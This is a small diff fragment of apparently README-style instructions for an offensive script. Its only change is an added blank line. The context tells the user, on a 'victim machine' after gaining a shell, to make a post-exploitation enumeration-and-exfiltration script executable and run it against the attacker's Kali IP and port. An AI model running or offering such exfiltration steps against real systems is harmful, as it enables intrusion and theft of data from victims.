@@ -6,6 +6,7 @@
 🖥️ On the Victim Machine (after gaining shell):
 
 chmod +x post_exploitation_enum_and_exfil.sh
+
 ./post_exploitation_enum_and_exfil.sh <your-kali-ip> <port>
 
 This will:
